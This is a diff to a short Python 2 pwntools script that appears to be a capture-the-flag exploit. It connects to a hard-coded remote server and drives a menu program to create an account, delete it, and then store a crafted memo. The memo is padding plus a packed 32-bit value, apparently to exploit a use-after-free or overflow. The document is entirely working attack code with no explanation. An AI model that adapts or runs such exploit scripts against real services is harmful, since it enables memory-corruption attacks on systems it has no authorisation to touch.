@@ -8,7 +8,7 @@ if local == True:
     PORT = 2323
 else:
     SERVER = "88.198.233.174"
-    PORT = 33807
+    PORT = 33864
 
 r = remote(SERVER, PORT)
 
@@ -16,25 +16,26 @@ memo = "AABACADAEAFAGAHAIAJAKALAMANAOBBCBDBEBFBGBHBIBJBKBLBMBNBOCCDCECFC"
 memo += p32(1801680230)
 
 def create_acc(r, fname, lname):
+    r.send("1\n")
     r.recvuntil(": ")
-    r.send(fname)
+    r.send(fname + "\n")
     r.recvuntil(": ")
-    r.send(lname)
-    r.recvuntil(": ")
+    r.send(lname + "\n")
+    print r.recvuntil("number: ")
 
 def delete_acc(r):
-    r.send("3")
-    r.recvuntil(": ")
+    r.send("3\n")
+    print r.recvuntil("number: ")
 
 def add_memo(r, memo):
+    r.send("4\n")
     r.recvuntil(":")
-    r.send(memo)
-    r.recvuntil(": ")
+    r.send(memo + "\n")
+    print r.recvuntil("number: ")
 
 
-r.recvline_contains("number")
-create_acc(r, "just", "kms")
+create_acc(r, "sdfdf", "ye")
 delete_acc(r)
-add_memo(r, "")
-
-print r.recvn(6)
+add_memo(r, memo)
+r.send("5\n")
+print r.recvn(60, timeout=5)
